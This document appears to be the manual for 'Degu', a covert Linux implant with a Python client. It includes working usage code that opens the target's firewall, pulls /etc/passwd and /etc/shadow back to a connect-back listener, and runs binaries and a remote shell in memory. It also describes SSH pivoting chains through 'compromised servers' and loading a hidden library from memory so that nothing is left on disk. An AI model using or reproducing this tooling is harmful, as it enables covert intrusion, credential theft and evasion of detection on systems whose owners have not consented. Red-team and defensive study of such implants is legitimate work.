# Degu Documentation

## Table of Contents

- [Degu Documentation](#degu-documentation)
    - [Table of Contents](#table-of-contents)
    - [Detailed Architecture](#detailed-architecture)
    - [Helpers](#helpers)
    - [key management](#key-management)
        - [Implant (Server Side)](#implant-server-side)
        - [Client Library (degu.py)](#client-library-degupy)
    - [Communication Protocol](#communication-protocol)
        - [Connection Establishment](#connection-establishment)
        - [Message Formats](#message-formats)
    - [Security and Encryption](#security-and-encryption)
        - [Encryption Mechanisms](#encryption-mechanisms)
    - [Python API Reference](#python-api-reference)
        - [Initialization](#initialization)
        - [Basic Communication](#basic-communication)
        - [File Operations](#file-operations)
        - [Memory Execution](#memory-execution)
        - [Advanced Usage - Helpers](#advanced-usage---helpers)
        - [Encryption and Data Manipulation](#encryption-and-data-manipulation)
        - [Static Utilities](#static-utilities)
    - [Obfuscation Techniques](#obfuscation-techniques)
        - [Library Loading](#library-loading)
    - [Complete Usage Examples](#complete-usage-examples)
        - [Connecting to an Implant and Executing Commands](#connecting-to-an-implant-and-executing-commands)
        - [Using Helpers for Persistent Connections](#using-helpers-for-persistent-connections)
    - [Known Limitations](#known-limitations)

## Detailed Architecture

## Helpers

Helpers are the most efficient way to use and chain multiple Degu instances together. 
A default helper `degussh` is provided, allowing the use of SSH to pivot and chain servers together.

After compiling Degu in the /tmp/degu/client/ directory, these components will be available to facilitate secure remote operations and server pivoting :

| File | Description |
|------|-------------|
| `degussh` | Binary executable that will be loaded and executed in memory on the target system |
| `degussh.py` | Python tool used as SSH ProxyCommand to establish connections through Degu implants |
| `keydegussh` | SSH private key used for authentication when connecting to bounce servers |



The provided Python script reimplements commands to natively use the SSH ControlPath Unix socket.

This enables efficient server chaining through Degu implants, as shown in the example below:


```bash
 /tmp/degu/client $ ssh  -oProxyCommand="./degussh.py -i 172.17.0.2 " -i keydegussh  -fNM -S ./dock .  
[+] knock to 172.17.0.2:53 bind to :29879
[+] DIRECT->172.17.0.2  	|░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░| 100%
 /tmp/degu/client $ ssh  -oProxyCommand="./degussh.py -i 172.17.0.3 -u ./dock " -i keydegussh  -fNM -S ./dock2 . 
[+] knock to 172.17.0.3:53 using ./dock bind to :2080
[+] ./dock->172.17.0.3  	|░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░| 100%
 /tmp/degu/client $ ssh  -oProxyCommand="./degussh.py -i 172.17.0.4 -u ./dock2 -p 12345 " -i keydegussh  -fNM -S ./dock3 . 
[+] knock to 172.17.0.4:12345 using ./dock2 bind to :43102
[+] ./dock2->172.17.0.4 	|░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░| 100%

```

This creates the following TCP connection chain:

`attacker -> 172.17.0.2:29879 -> 172.17.0.3:2080 -> 172.17.0.4:43102`

By leveraging SSH's ControlPath functionality, the script enables seamless pivoting through multiple compromised servers while maintaining secure communication.


## key management

To build degu first you need to generate new ED25519 key pair.
You can use `./config` utility or the `keygen()` in degu.py library. 

<h3> keys generation </h3>

`./config` generate all secrets for a future degu release in `keys.h`:

-   IV and KNOCK_KEY are used to trigger initial communication with degu and for data ciphering after key exchange.
-   MASTER_PUBKEY is the public part of ed25519 key it is used by degu to verify signature and make secret exchange with client for encryption
-   PRIVATE_KEY is used by client part, you need to pass it in constructor of degu  python object


```python
>>> import degu
>>> myheaderfile = degu.degu.keygen()
>>> print(myheaderfile)
#define IV            { 0x03,0x7b,0xb6,0x59,0x62,0xf0,0xf5,0x56,0xa6,0x68,0xfc,0xa1,0x97,0xb8,0xbd,0x85}
#define KNOCK_KEY     { 0xc9,0xd5,0x52,0x70,0xd1,0x28,0xae,0xcd,0x96,0xda,0xa6,0x5c,0x57,0xf4,0x27,0x92,0xb7,0x65,0x3f,0xd3,0xc5,0x60,0x68,0x05,0x1f,0x71,0xed,0x8d,0xa9,0x3e,0x38,0x58}
#define MASTER_PUBKEY { 0x58,0xe4,0x37,0x0f,0x17,0x5f,0x3f,0xd7,0x07,0x3d,0xd0,0x77,0xbe,0x86,0x9a,0x60,0x34,0x80,0xff,0xae,0xcc,0xf2,0xa1,0x1d,0x60,0xff,0x76,0x44,0xfc,0x26,0x9d,0x06}

// PRIVATE_KEY="f04860177b7bcb3a4b9aaaa052fbd9218d6f0117bb0c9c7a02905809d1a0747ccc5b728445811ed1222ed1e024042c37b2164b494bb77f867d54b63f29cb62e1"

```
you can also directly call the C function keygen in degu.so library with a filename to generate as parameter (you can discard secret1 and secret2 variables that are tests on ECDH)

```python
>>> import ctypes
>>> mydegu = ctypes.CDLL("../degu.so")
>>> mydegu.keygen(b"/tmp/out")
0
>>> 
[1]+  Stopped                 python
$ cat /tmp/out 
pub="63181b1acc84276954cd80be5afb0c95de7b1b7c9fb3c4e3b8e364a85f890116"
priv="5837122bd526a2e5d64ef89aca78d80ac4e0b4ef4d1d76a6ddb18bdd17856a6911602bdebf237a361ab796518038d5aef88b0aebdc3c1523407f0ab62e457420"
iv="4e6e4e04de107ae5790c5bfe61ce52e5"
knock="79abc02eeb0bcf41c1a1e6f8491eb0b3cedce7786338cc88955f4cf76fa79f52"
```

`dgu` client script generate keys too

```bash
 $ ./dgu keygen
#define IV            { 0x3c,0x65,0x64,0x22,0x64,0x11,0x6f,0xc8,0x68,0xfd,0xa9,0x52,0xc6,0x7b,0x15,0xd1}
#define KNOCK_KEY     { 0xf9,0x7e,0x46,0x46,0xaa,0xd9,0xaa,0x96,0xfb,0xba,0x81,0x70,0x51,0xc3,0x98,0x1e,0x74,0xd5,0x7c,0x28,0x09,0x7f,0xbd,0x52,0xd4,0xdf,0x32,0x90,0xfe,0x94,0xa9,0x36}
#define MASTER_PUBKEY { 0x60,0x88,0xdd,0xfc,0xee,0x3c,0x21,0xf5,0xb6,0x69,0x13,0xa9,0xf8,0xa7,0xc9,0xb9,0x50,0x25,0x14,0xfe,0x18,0x44,0x5d,0xea,0xad,0x25,0x55,0x08,0x60,0x60,0x89,0xa0}

// PRIVATE_KEY="c8ecf68f5fad5fc8b9232548ff38bdbb81aa13d3d6cab322aaf2037802d3554b87755b4056bd4b5f4bc9219cc1615bc59afe2e69fbbd6cf633d8f9f74674579e"

```
The output needs to be piped into **keys.h** file at root of degu project

<h3> keys recovery </h3>

If you lost the knock and public key you can still recover it by calling python function `getpub()`

```python
>>> import degu
>>> degu.degu.getpub()
#define IV            { 0x3c,0x65,0x64,0x22,0x64,0x11,0x6f,0xc8,0x68,0xfd,0xa9,0x52,0xc6,0x7b,0x15,0xd1}
#define KNOCK_KEY     { 0xf9,0x7e,0x46,0x46,0xaa,0xd9,0xaa,0x96,0xfb,0xba,0x81,0x70,0x51,0xc3,0x98,0x1e,0x74,0xd5,0x7c,0x28,0x09,0x7f,0xbd,0x52,0xd4,0xdf,0x32,0x90,0xfe,0x94,0xa9,0x36}
#define MASTER_PUBKEY { 0x60,0x88,0xdd,0xfc,0xee,0x3c,0x21,0xf5,0xb6,0x69,0x13,0xa9,0xf8,0xa7,0xc9,0xb9,0x50,0x25,0x14,0xfe,0x18,0x44,0x5d,0xea,0xad,0x25,0x55,0x08,0x60,0x60,0x89,0xa0}
```
By calling directly degu.so function `xpub()`, it outputs the file on stdout
```python
>>> import ctypes
>>> d = ctypes.CDLL("../degu.so")
>>> d.xpub()
#define IV		{0x3c,0x65,0x64,0x22,0x64,0x11,0x6f,0xc8,0x68,0xfd,0xa9,0x52,0xc6,0x7b,0x15,0xd1}
#define KNOCK_KEY	{0xf9,0x7e,0x46,0x46,0xaa,0xd9,0xaa,0x96,0xfb,0xba,0x81,0x70,0x51,0xc3,0x98,0x1e,0x74,0xd5,0x7c,0x28,0x09,0x7f,0xbd,0x52,0xd4,0xdf,0x32,0x90,0xfe,0x94,0xa9,0x36}
#define MASTER_PUBKEY	{0x60,0x88,0xdd,0xfc,0xee,0x3c,0x21,0xf5,0xb6,0x69,0x13,0xa9,0xf8,0xa7,0xc9,0xb9,0x50,0x25,0x14,0xfe,0x18,0x44,0x5d,0xea,0xad,0x25,0x55,0x08,0x60,0x60,0x89,0xa0}
6
>>> 
```

Or you can just use the client script to recover pub keys

```bash
 $ ./dgu getpub
#define IV            { 0x3c,0x65,0x64,0x22,0x64,0x11,0x6f,0xc8,0x68,0xfd,0xa9,0x52,0xc6,0x7b,0x15,0xd1}
#define KNOCK_KEY     { 0xf9,0x7e,0x46,0x46,0xaa,0xd9,0xaa,0x96,0xfb,0xba,0x81,0x70,0x51,0xc3,0x98,0x1e,0x74,0xd5,0x7c,0x28,0x09,0x7f,0xbd,0x52,0xd4,0xdf,0x32,0x90,0xfe,0x94,0xa9,0x36}
#define MASTER_PUBKEY { 0x60,0x88,0xdd,0xfc,0xee,0x3c,0x21,0xf5,0xb6,0x69,0x13,0xa9,0xf8,0xa7,0xc9,0xb9,0x50,0x25,0x14,0xfe,0x18,0x44,0x5d,0xea,0xad,0x25,0x55,0x08,0x60,0x60,0x89,0xa0}
```

### Implant (Server Side)

The Degu implant can operate in two different modes:
1. **Passive Mode**: Monitors DNS traffic to detect commands
2. **Active Mode**: Listens on a specific UDP port to receive instructions

The implant activates after receiving a special "knock" message that triggers either:
- Opening a TCP port to accept incoming connections (bind mode)
- Establishing an outgoing TCP connection to a specified host and port (connect-back mode)

### Client Library (degu.py)

The client library provides a Python interface for interacting with the remote implant. It handles:
- Generation and management of cryptographic keys
- Creation and encryption of messages
- Sending commands to the implant
- Receiving and processing responses

## Communication Protocol

### Connection Establishment

1. The client sends an encrypted UDP "knock" to the implant (on port 53 by default or a configurable port)
2. The implant validates the message and activates (in bind or connect-back mode)
3. A TCP connection is established for data exchange
4. Session keys are exchanged to secure the communication

### Message Formats

The exchanged messages follow specific formats depending on the operation type:

| Operation Code | Byte Value | Description |
|----------------|------------|-------------|
| DEGU_EXE_UL    | "<o)~"    | Memory execution of a binary via ulexec |
| DEGU_EXE_MEMFD | "<o):"    | Memory execution of a binary via memfd |
| DEGU_DL        | "Oo<<"    | File download from the implant |
| DEGU_UP        | "Oo>>"    | File upload to the implant |

## Security and Encryption

### Encryption Mechanisms

Degu uses multiple security layers:
1. **AES Encryption** for communications (with custom IV)
2. **ED25519 Signatures** to authenticate commands
3. **ECDH Key Exchange** to establish secure session keys


## Python API Reference

### Initialization
```python
def __init__(self, host: str, priv: str=PRIV, kport: int=53) -> None
```
- **host**: IP address or hostname of the implant
- **priv**: Private key (hexadecimal format)
- **kport**: UDP port for the knock (53 by default for root implants)

### Basic Communication
```python
def knock(self, data: str) -> bool
```
Sends a knock signal to the implant to activate a connection.
- **data**: Format "ip:port" for connect-back or ":port" for bind
- **Returns**: True if the knock was sent, False otherwise

```python
def ghost_exec(self, mycmd: str) -> None
```
Executes a system command on the implant without waiting for a response.
- **mycmd**: Shell command to execute (limit of 1300 characters)

### File Operations
```python
def download(self, path: str) -> bytes
```
Downloads a file from the implant in bind mode.
- **path**: File path on the implant
- **Returns**: File content or None in case of error

```python
def rdownload(self, path: str, lport: int, timeout: int=5) -> bytes
```
Downloads a file from the implant in connect-back mode.
- **path**: File path on the implant
- **lport**: Local listening port
- **timeout**: Timeout in seconds
- **Returns**: File content or None in case of error

```python
def upload(self, file: str, path: str) -> int
```
Uploads a file to the implant in bind mode.
- **file**: Path of the local file to send
- **path**: Destination path on the implant
- **Returns**: Size of sent data or None in case of error

```python
def rupload(self, file: str, path: str, lport: int, timeout: int=5) -> int
```
Uploads a file to the implant in connect-back mode.
- **file**: Path of the local file to send
- **path**: Destination path on the implant
- **lport**: Local listening port
- **timeout**: Timeout in seconds
- **Returns**: Size of sent data or None in case of error

### Memory Execution
```python
def mem_exec(self, bin: str, param: str, memfd: bool=False) -> None
```
Executes a binary in memory on the implant in bind mode.
- **bin**: Path of the local binary to execute
- **param**: Arguments for the binary (including the program name in args[0])
- **memfd**: Uses memfd instead of ulexec if True

```python
def rmem_exec(self, bin: str, param: str, lport: int, timeout: int=5, memfd: bool=False) -> None
```
Executes a binary in memory on the implant in connect-back mode.
- **bin**: Path of the local binary to execute
- **param**: Arguments for the binary (including the program name in args[0])
- **lport**: Local listening port
- **timeout**: Timeout in seconds
- **memfd**: Uses memfd instead of ulexec if True

### Advanced Usage - Helpers
```python
def helper(self, bin: str, param: str, memfd: bool=False) -> socket.socket
```
Executes a binary in memory and returns the socket for reuse (bind mode).
- **bin**: Path of the helper binary to use
- **param**: Arguments for the binary
- **memfd**: Uses memfd instead of ulexec if True
- **Returns**: Open socket for communication with the remote process

```python
def rhelper(self, bin: str, param: str, lport: int, timeout: int=5, memfd: bool=False) -> socket.socket
```
Executes a binary in memory and returns the socket for reuse (connect-back mode).
- **bin**: Path of the helper binary to use
- **param**: Arguments for the binary
- **lport**: Local listening port
- **timeout**: Timeout in seconds
- **memfd**: Uses memfd instead of ulexec if True
- **Returns**: Open socket for communication with the remote process

### Encryption and Data Manipulation
```python
def xbuf(self, data: bytes) -> bytes
```
Encrypts/decrypts data with the session context.
- **data**: Data to encrypt/decrypt
- **Returns**: Encrypted/decrypted data

```python
def xcrypt_knock(self, data: bytes) -> bytes
```
Encrypts/decrypts a knock message with the knock key.
- **data**: Knock data to encrypt/decrypt
- **Returns**: Encrypted/decrypted data

```python
def sign_msg(self, data: bytes) -> bytes
```
Signs data with the private key.
- **data**: Data to sign
- **Returns**: Signature (64 bytes)

### Static Utilities
```python
@staticmethod
def keygen() -> str
```
Generates a new ED25519 key pair and associated values.
- **Returns**: Formatted content for insertion into keys.h

```python
@staticmethod
def getpub() -> None
```
Displays Degu internal information (public keys and IV).

## Obfuscation Techniques

### Library Loading
The degu.so library is embedded as base64-encoded and compressed data in the Python code. 

It is extracted and loaded into memory at runtime via `memfd_create` or a temporary file, which avoids leaving traces on disk.

## Complete Usage Examples

### Connecting to an Implant and Executing Commands
```python
import degu
import time

# Initialize connection
d = degu.degu("192.168.0.10")

# Execute command without response
d.ghost_exec("iptables -P INPUT ACCEPT")

# Open a port on the implant
d.knock(":4444")
time.sleep(2)  # Wait for activation

# Download a file
content = d.download("/etc/passwd")
print(content)

# Upload a file
d.upload("/local/path/file.txt", "/remote/path/file.txt")

# Execute a binary in memory
d.mem_exec("./my_binary", "my_binary arg1 arg2")

# Connect-back - Listen on local port 5555
d.knock("192.168.0.20:5555")  # Client IP and port
time.sleep(2)
result = d.rdownload("/etc/shadow", 5555)
```

### Using Helpers for Persistent Connections
```python
# Execute a shell via a helper
socket = d.helper("./helper_shell", "shell")

# Interactive communication with the shell
socket.send(b"ls -la\n")
response = socket.recv(4096)
print(response)

# Close the connection
socket.close()
```

## Known Limitations

1. Maximum size of ghost_exec commands is limited to 1300 characters
2. Operations are sensitive to network issues (configurable timeouts)
3. Userland execution of binaries requires the binary to be statically linked
4. It does not maintain persistence after system reboot